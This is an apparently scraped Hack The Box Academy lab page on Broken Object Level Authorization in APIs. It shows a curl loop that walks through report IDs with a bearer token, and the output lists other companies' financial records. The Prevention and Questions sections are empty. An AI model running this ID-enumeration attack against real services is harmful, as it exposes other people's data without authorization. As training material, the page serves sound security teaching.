<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/268/section/3061
// Platform Version: V1
// Module ID: 268
// Module Name: API Attacks
// Module Difficulty: Medium
// Section ID: 3061
// Section Title: Broken Object Level Authorization
// Page Title: Hack The Box - Academy
// Page Number: 03
-->

# Broken Object Level Authorization

**Module Name:** API Attacks **Page Number:** 03

#### 

#### API ATTACKS

# Broken Object Level Authorization

## Authorization Bypass Through User-Controlled Key

### Scenario

![https://academy.hackthebox.com/storage/modules/268/Authenitcation_Suppliers.gif](https://academy.hackthebox.com/storage/modules/268/Authenitcation_Suppliers.gif)

![https://academy.hackthebox.com/storage/modules/268/Authentication_Suppliers_2.gif](https://academy.hackthebox.com/storage/modules/268/Authentication_Suppliers_2.gif)

![https://academy.hackthebox.com/storage/modules/268/API1_2023_Broken_Object_Level_Authorization_Image_5.png](https://academy.hackthebox.com/storage/modules/268/API1_2023_Broken_Object_Level_Authorization_Image_5.png)

![https://academy.hackthebox.com/storage/modules/268/API1_2023_Broken_Object_Level_Authorization_Image_6.png](https://academy.hackthebox.com/storage/modules/268/API1_2023_Broken_Object_Level_Authorization_Image_6.png)

![https://academy.hackthebox.com/storage/modules/268/API1_2023_Broken_Object_Level_Authorization_Image_7.png](https://academy.hackthebox.com/storage/modules/268/API1_2023_Broken_Object_Level_Authorization_Image_7.png)

![https://academy.hackthebox.com/storage/modules/268/API1_2023_Broken_Object_Level_Authorization_Image_8.png](https://academy.hackthebox.com/storage/modules/268/API1_2023_Broken_Object_Level_Authorization_Image_8.png)

![https://academy.hackthebox.com/storage/modules/268/API1_2023_Broken_Object_Level_Authorization_Image_9.png](https://academy.hackthebox.com/storage/modules/268/API1_2023_Broken_Object_Level_Authorization_Image_9.png)

![https://academy.hackthebox.com/storage/modules/268/API1_2023_Broken_Object_Level_Authorization_Image_10.png](https://academy.hackthebox.com/storage/modules/268/API1_2023_Broken_Object_Level_Authorization_Image_10.png)

![https://academy.hackthebox.com/storage/modules/268/API1_2023_Broken_Object_Level_Authorization_Image_11.png](https://academy.hackthebox.com/storage/modules/268/API1_2023_Broken_Object_Level_Authorization_Image_11.png)

![https://academy.hackthebox.com/storage/modules/268/BOLA_Mass_Abuse.gif](https://academy.hackthebox.com/storage/modules/268/BOLA_Mass_Abuse.gif)

``` shell-session
lbek@htb[/htb]$ for ((i=1; i<= 20; i++)); do
curl -s -w "\n" -X 'GET' \
  'http://94.237.49.212:43104/api/v1/supplier-companies/yearly-reports/'$i'' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjFAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOiJTdXBwbGllckNvbXBhbmllc19HZXRZZWFybHlSZXBvcnRCeUlEIiwiZXhwIjoxNzIwMTg1NzAwLCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.D6E5gJ-HzeLZLSXeIC4v5iynZetx7f-bpWu8iE_pUODlpoWdYKniY9agU2qRYyf6tAGdTcyqLFKt1tOhpOsWlw' | jq
done

{
  "supplierCompanyYearlyReport": {
    "id": 1,
    "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
    "year": 2020,
    "revenue": 794425112,
    "commentsFromCLevel": "Superb work! The Board is over the moon! All employees will enjoy a dream vacation!"
  }
}
{
  "supplierCompanyYearlyReport": {
    "id": 2,
    "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
    "year": 2022,
    "revenue": 339322952,
    "commentsFromCLevel": "Excellent performance! The Board is exhilarated! Prepare for a special vacation adventure!"
  }
}
{
  "supplierCompanyYearlyReport": {
    "id": 3,
    "companyID": "058ac1e5-3807-47f3-b546-cc069366f8f9",
    "year": 2020,
    "revenue": 186208503,
    "commentsFromCLevel": "Phenomenal performance! The Board is deeply impressed! Everyone will be treated to a deluxe vacation!"
  }
}

<SNIP>
```

### Prevention

# 

# 

#### Questions

####